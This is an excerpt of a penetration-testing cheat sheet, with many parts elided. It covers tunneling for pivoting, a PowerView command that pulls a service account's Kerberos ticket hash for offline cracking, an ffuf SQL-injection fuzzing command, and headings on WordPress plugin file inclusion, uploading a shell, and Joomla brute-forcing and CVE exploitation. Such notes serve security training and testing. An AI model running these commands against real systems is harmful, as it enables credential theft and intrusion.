...
- [Pivoting, Tunneling, and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
    ...
    - [Ligolo-ng + Chisel : Pivotting with HTTP Tunneling](#Ligolo+and+Chisel+Pivotting+with+HTTP+Tunneling)
    - [Ligolo-ng + dnscat2 : Pivotting with DNS Tunneling](#Ligolo+and+dnscat2+Pivotting+with+DNS+Tunneling)
...
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty Hash | Out-File -FilePath sqldev_hash.txt -Encoding ascii -Width 8000
...
ffuf -request request.txt -w Generic_UnionSelect.txt -t 5 -x https://127.0.0.1:8080 -enc FUZZ:urlencode  -request-proto http
```
...
##### Application Discovery & Enumeration with nmap, EyeWitness , aquatone 
```
...
# Runs eyewitness using a file generated by an nmap scan (web_discovery.xml contain subdomains) and creates a directory (-d)
...
# Local File Inclusion with plugins mail-masta 
...
# Upload shell with plugins wpDiscuz  (https://www.exploit-db.com/exploits/49967)
...
##### Attacking Joomla 
```
# droopescan is an automated Joomla scanner and enumeration tool
...
=======================================
using joomlascan to enum
=======================================

# Alternative Installation of Python2.7 and create env
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
...
=======================================
using joomla-bruteforce to brute
=======================================

# brute with joomla-bruteforce
...
# CVE-2019-10945 Directory Traversal / Authenticated Arbitrary File Deletion ( https://github.com/dpgg101/CVE-2019-10945 )
